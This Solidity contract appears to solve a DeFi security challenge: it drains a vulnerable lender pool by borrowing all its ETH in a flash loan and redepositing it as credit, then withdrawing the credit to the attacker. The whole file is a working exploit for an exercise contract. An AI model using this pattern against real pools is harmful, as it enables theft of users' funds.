// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../side-entrance/SideEntranceLenderPool.sol";

/**
 * @title SideEntranceAttacker
 * @notice Contract to exploit the SideEntranceLenderPool vulnerability
 */
contract SideEntranceAttacker is IFlashLoanEtherReceiver {
    SideEntranceLenderPool private pool;
    address private owner;

    constructor(address _poolAddress) public {
        pool = SideEntranceLenderPool(_poolAddress);
        owner = msg.sender;
    }
    
    /**
     * @notice Launches the attack by borrowing all ETH from the pool
     */
    function attack() external {
        // Borrow all ETH from the pool
        uint256 poolBalance = address(pool).balance;
        pool.flashLoan(poolBalance);
    }
    
    /**
     * @notice Function called during the flashloan
     * @dev Deposits the borrowed ETH into our pool balance
     */
    function execute() external payable override {
        // Deposit borrowed ETH to create credit in our balance
        pool.deposit{value: msg.value}();
    }
    
    /**
     * @notice Withdraws ETH from the pool and sends it to the attacker
     */
    function withdraw() external {
        require(msg.sender == owner, "Only owner can withdraw");
        
        // Withdraw all our "deposited" ETH
        pool.withdraw();
        
        // Send ETH to the attacker
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }
    
    /**
     * @notice Allows the contract to receive ETH
     */
    receive() external payable {}
}